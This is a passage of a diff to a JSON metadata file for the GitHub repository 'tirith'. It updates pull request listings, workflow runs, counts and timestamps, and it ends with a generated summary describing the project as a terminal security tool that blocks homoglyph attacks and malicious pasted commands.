-      "state": "open",
-      "updatedAt": "2026-09-12T07:23:43Z",
-      "author": "sheeki03",
-      "draft": true
-    },
-    {
-      "number": 250,
-      "title": "Align policy diagnostics and machine output contracts",
-      "url": "https://github.com/sheeki03/tirith/pull/250",
-      "state": "open",
-      "updatedAt": "2026-09-12T06:26:58Z",
-      "author": "sheeki03",
-      "draft": true
-    },
-    {
-      "number": 245,
-      "title": "chore(threatdb): refresh source pins",
-      "url": "https://github.com/sheeki03/tirith/pull/245",
-      "state": "closed",
-      "updatedAt": "2026-09-11T16:52:40Z",
-      "author": "github-actions[bot]",
-      "draft": false
-    },
-    {
-      "number": 242,
-      "title": "ci: bump the github-actions group across 1 directory with 3 updates",
-      "url": "https://github.com/sheeki03/tirith/pull/242",
-      "state": "closed",
-      "updatedAt": "2026-09-11T16:52:36Z",
-      "author": "dependabot[bot]",
-      "draft": false
-    },
-    {
-      "number": 163,
-      "title": "fix(release): lower the linux-gnu glibc floor so binaries run on EL8 / Amazon Linux 2023",
-      "url": "https://github.com/sheeki03/tirith/pull/163",
-      "state": "closed",
-      "updatedAt": "2026-09-11T16:52:34Z",
-      "author": "hellno",
-      "draft": false
-    },
-    {
-      "number": 167,
-      "title": "fix: recognize operational policy fields in validator",
-      "url": "https://github.com/sheeki03/tirith/pull/167",
-      "state": "closed",
-      "updatedAt": "2026-09-11T16:52:30Z",
-      "author": "visualfox-ch",
-      "draft": false
     }
   ],
-  "branchCount": 94,
+  "branchCount": 125,
   "tagCount": 90,
   "workflowRuns": [
     {
-      "name": "Fuzz",
-      "status": "action_required",
-      "url": "https://github.com/sheeki03/tirith/actions/runs/34680701089",
-      "branch": "automation/threatdb-source-pins",
-      "updatedAt": "2026-09-12T07:25:36Z"
+      "name": "Threat DB Build",
+      "status": "success",
+      "url": "https://github.com/sheeki03/tirith/actions/runs/35980282651",
+      "branch": "main",
+      "updatedAt": "2026-09-24T09:22:27Z"
     },
     {
-      "name": "CI",
+      "name": "Fuzz",
       "status": "action_required",
-      "url": "https://github.com/sheeki03/tirith/actions/runs/34680701014",
+      "url": "https://github.com/sheeki03/tirith/actions/runs/35972077889",
       "branch": "automation/threatdb-source-pins",
-      "updatedAt": "2026-09-12T07:25:36Z"
+      "updatedAt": "2026-09-24T07:53:19Z"
     },
     {
       "name": "Benchmarks",
       "status": "action_required",
-      "url": "https://github.com/sheeki03/tirith/actions/runs/34680700997",
+      "url": "https://github.com/sheeki03/tirith/actions/runs/35972077701",
       "branch": "automation/threatdb-source-pins",
-      "updatedAt": "2026-09-12T07:25:36Z"
+      "updatedAt": "2026-09-24T07:53:19Z"
+    },
+    {
+      "name": "CI",
+      "status": "action_required",
+      "url": "https://github.com/sheeki03/tirith/actions/runs/35972077645",
+      "branch": "automation/threatdb-source-pins",
+      "updatedAt": "2026-09-24T07:53:19Z"
     },
     {
       "name": "ThreatDB source pin watcher",
       "status": "success",
-      "url": "https://github.com/sheeki03/tirith/actions/runs/34680415501",
+      "url": "https://github.com/sheeki03/tirith/actions/runs/35971447381",
       "branch": "main",
-      "updatedAt": "2026-09-12T07:25:35Z"
-    },
-    {
-      "name": "Release",
-      "status": "success",
-      "url": "https://github.com/sheeki03/tirith/actions/runs/34679302132",
-      "branch": "codex/fix-user-install-privileges",
-      "updatedAt": "2026-09-12T07:16:29Z"
+      "updatedAt": "2026-09-24T07:53:20Z"
     }
   ],
   "community": {
@@ -3366,13 +3416,13 @@
       "url": "https://github.com/sheeki03"
     }
   ],
-  "openIssuesOnly": 1,
-  "openPRs": 4,
+  "openIssuesOnly": 7,
+  "openPRs": 9,
   "releaseCount": 90,
   "discussionsEnabled": false,
   "discussionCount": 0,
   "discussions": [],
-  "closedIssues": 86,
+  "closedIssues": 87,
   "mergedPRs": 99,
   "environmentCount": 3,
   "isFork": false,
@@ -3384,7 +3434,7 @@
     "publishedAt": "2026-09-11T16:41:40Z"
   },
   "factsVersion": 3,
-  "factsUpdatedAt": "2026-09-12T07:36:16.871Z",
+  "factsUpdatedAt": "2026-09-24T19:44:05.971Z",
   "aiSummary": {
     "oneLiner": "A terminal security tool that detects and prevents execution of homoglyph attacks and malicious scripts.",
     "whatItDoes": "Tirith is a security utility designed to protect terminal environments from subtle, difficult-to-detect threats like homoglyph attacks (e.g., using Cyrillic 'a' instead of Latin 'a' in a URL). It acts as an interception layer, analyzing commands before they are executed by the shell. When a user pastes a seemingly harmless command that contains hidden malicious characters or points to compromised endpoints, Tirith blocks the execution and alerts the user. This defense mechanism is crucial against modern social engineering and supply chain attacks that exploit the terminal's inability to distinguish visually identical characters.",
